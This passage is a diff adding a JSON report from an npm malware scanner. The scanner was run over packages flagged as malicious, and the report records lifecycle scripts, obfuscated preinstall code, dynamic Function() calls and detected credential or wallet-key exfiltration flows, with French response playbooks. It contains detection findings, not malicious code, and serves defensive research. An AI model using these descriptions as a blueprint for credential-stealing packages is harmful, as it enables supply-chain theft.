@@ -1,0 +1,3866 @@
+{
+  "metadata": {
+    "scanned_at": "2026-02-26T23:38:27.047Z",
+    "total_interesting": 73,
+    "downloaded": 73,
+    "failed": 0,
+    "scanned": 73,
+    "detected": 70,
+    "missed": 3,
+    "wild_tpr": "95.9%"
+  },
+  "results": [
+    {
+      "mal_id": "MAL-2026-995",
+      "package": "vl-ui-contact-card",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:24Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-994",
+      "package": "vl-ui-code-preview",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:44:05Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-993",
+      "package": "vl-ui-checkbox",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:08Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-992",
+      "package": "vl-ui-button",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:14Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-991",
+      "package": "vl-ui-breadcrumb",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:10Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-990",
+      "package": "vl-ui-body",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:10Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-988",
+      "package": "vl-ui-action-group",
+      "version": "10.1.1",
+      "all_versions": [
+        "10.1.1"
+      ],
+      "published": "2026-02-22T20:34:16Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-981",
+      "package": "dt-fe-t2d-marketplace",
+      "version": "71.0.2",
+      "all_versions": [
+        "71.0.2"
+      ],
+      "published": "2026-02-22T07:22:23Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 3,
+      "threat_count": 1,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-975",
+      "package": "azure-postgresql-auth",
+      "version": "1.1.4",
+      "all_versions": [
+        "1.1.4",
+        "1.1.2"
+      ],
+      "published": "2026-02-20T17:55:01Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 28,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "CRITICAL",
+          "message": "Suspicious flow: credentials read (USER) + network send (get, http.get)",
+          "file": "index.js",
+          "count": 1,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 25
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-944",
+      "package": "realestate-ask",
+      "version": "0.0.200",
+      "all_versions": [
+        "0.0.200"
+      ],
+      "published": "2026-02-17T10:30:44Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 6,
+      "threat_count": 2,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"postinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-943",
+      "package": "ethereums-lint",
+      "version": "6.16.0",
+      "all_versions": [
+        "6.16.0"
+      ],
+      "published": "2026-02-15T16:24:02Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 29,
+      "threat_count": 11,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_call_function",
+          "severity": "MEDIUM",
+          "message": "Function() with dynamic expression (template/factory pattern).",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-005",
+          "rule_name": "new Function() Constructor",
+          "confidence": "high",
+          "references": [
+            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.",
+          "points": 3
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 55). Signaux: string_array, base64_eval",
+          "file": "dist\\ethers.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 55). Signaux: string_array, base64_eval",
+          "file": "dist\\ethers.umd.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "HIGH",
+          "message": "Code obfusque (score: 55). Signaux: long_single_lines, obfuscated_variables",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 10
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.umd.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.umd.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "js_obfuscation_pattern",
+          "severity": "HIGH",
+          "message": "JS obfuscator hex variables detected (123 unique _0x* vars) — signature of javascript-obfuscator/obfuscator.io",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-003",
+          "rule_name": "JS Obfuscation Pattern",
+          "confidence": "high",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/002/",
+            "https://attack.mitre.org/techniques/T1027/010/",
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027.002",
+          "playbook": "Pattern d'obfuscation JS detecte (variables _0x*, string arrays encodes, eval+payload, long base64). Analyser dans un sandbox. Comparer avec les signatures Shai-Hulud/chalk/debug.",
+          "points": 10
+        },
+        {
+          "type": "high_entropy_string",
+          "severity": "MEDIUM",
+          "message": "High entropy string (6.02 bits, 65 chars) — possible base64/hex/encrypted payload",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-ENTROPY-001",
+          "rule_name": "High Entropy String",
+          "confidence": "medium",
+          "references": [
+            "https://attack.mitre.org/techniques/T1027/"
+          ],
+          "mitre": "T1027",
+          "playbook": "Chaine a haute entropie detectee. Verifier si c'est du base64, hex, ou un payload chiffre. Analyser le contexte d'utilisation.",
+          "points": 3
+        }
+      ]
+    },
+    {
+      "mal_id": "MAL-2026-942",
+      "package": "ethereum-lint",
+      "version": "2.0.2",
+      "all_versions": [
+        "2.0.2"
+      ],
+      "published": "2026-02-15T16:20:05Z",
+      "credit": [
+        "Amazon Inspector",
+        "OpenSSF: Package Analysis"
+      ],
+      "status": "scanned",
+      "score": 29,
+      "threat_count": 11,
+      "detected": true,
+      "threats": [
+        {
+          "type": "lifecycle_script",
+          "severity": "MEDIUM",
+          "message": "Script \"preinstall\" detected. Common attack vector.",
+          "file": "package.json",
+          "count": 1,
+          "rule_id": "MUADDIB-PKG-001",
+          "rule_name": "Suspicious Lifecycle Script",
+          "confidence": "medium",
+          "references": [
+            "https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm"
+          ],
+          "mitre": "T1195.002",
+          "playbook": "Verifier le contenu du script. Desactiver avec \"npm config set ignore-scripts true\" si suspect.",
+          "points": 3
+        },
+        {
+          "type": "dangerous_call_function",
+          "severity": "MEDIUM",
+          "message": "Function() with dynamic expression (template/factory pattern).",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-AST-005",
+          "rule_name": "new Function() Constructor",
+          "confidence": "high",
+          "references": [
+            "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function"
+          ],
+          "mitre": "T1059.007",
+          "playbook": "Appel new Function() detecte. Equivalent a eval(). Verifier la source des donnees.",
+          "points": 3
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 55). Signaux: string_array, base64_eval",
+          "file": "dist\\ethers.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "LOW",
+          "message": "Code obfusque (score: 55). Signaux: string_array, base64_eval",
+          "file": "dist\\ethers.umd.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 1
+        },
+        {
+          "type": "obfuscation_detected",
+          "severity": "HIGH",
+          "message": "Code obfusque (score: 55). Signaux: long_single_lines, obfuscated_variables",
+          "file": "vendor\\scrypt-js\\preinstall.js",
+          "count": 1,
+          "rule_id": "MUADDIB-OBF-001",
+          "rule_name": "Code Obfuscation Detected",
+          "confidence": "medium",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1027",
+          "playbook": "Code volontairement obscurci. Analyser dans un environnement isole. Probable malware.",
+          "points": 10
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
+          "message": "Suspicious flow: credentials read (privateKey, mnemonic, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, mnemonic, mnemonic, privateKey, privateKey, privateKey, mnemonic, privateKey, privateKey, mnemonic, mnemonic, mnemonic, mnemonic, privateKey, privateKey, privateKey) + network send (fetch, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, get, get, get, get, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, fetch, get, get, get, get, get, get, get, request, request, request, get, get, get)",
+          "file": "dist\\ethers.min.js",
+          "count": 1,
+          "unreachable": true,
+          "rule_id": "MUADDIB-FLOW-001",
+          "rule_name": "Suspicious Data Flow",
+          "confidence": "high",
+          "references": [
+            "https://blog.phylum.io/shai-hulud-npm-worm"
+          ],
+          "mitre": "T1041",
+          "playbook": "CRITIQUE: Code lit des credentials et les envoie sur le reseau. Exfiltration probable. Isoler la machine, regenerer tous les secrets.",
+          "points": 1
+        },
+        {
+          "type": "suspicious_dataflow",
+          "severity": "LOW",
